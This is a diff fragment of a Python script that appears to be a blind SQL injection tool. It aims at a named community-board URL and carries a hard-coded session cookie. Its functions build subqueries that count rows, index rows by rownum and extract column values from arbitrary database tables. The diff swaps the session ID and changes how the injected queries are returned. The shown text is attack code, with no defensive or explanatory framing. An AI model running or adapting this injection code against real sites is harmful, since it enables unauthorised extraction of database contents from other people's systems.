@@ -1,7 +1,7 @@
 ### VAL AREA
 targetURL = "http://elms1.skinfosec.co.kr:8082/community6/free"
 headers = {"Content-Type": "application/x-www-form-urlencoded"}
-cookies = {"JSESSIONID": "8623A875E3EA6CF5471045FFA0614F6F"}
+cookies = {"JSESSIONID": "D736447B0E6D3A633EF0AD286A22861D"}
 data = {
     "startDt": "",
     "endDt": "",
@@ -19,7 +19,7 @@ def get_count(column, table):
         "(SELECT COUNT(" + column + ") AS total_usernames FROM " + table + ") > "
     )
 
-    return baseQuery.format(countQuery)
+    return countQuery
 
 
 def get_index(column, table):
@@ -33,7 +33,7 @@ def get_index(column, table):
         + ") WHERE rnum = {}) > "
     )
 
-    return baseQuery.format(indexQuery)
+    return indexQuery
 
 
 def get_data(column, table):
@@ -47,10 +47,10 @@ def get_data(column, table):
         + ") WHERE rnum = {}) > "
     )
 
-    return baseQuery.format(dataQuery)
+    return dataQuery
 
 
-def get_val(var_name):
+def get_var(var_name):
     if var_name in globals():
         return globals()[var_name]
     else:
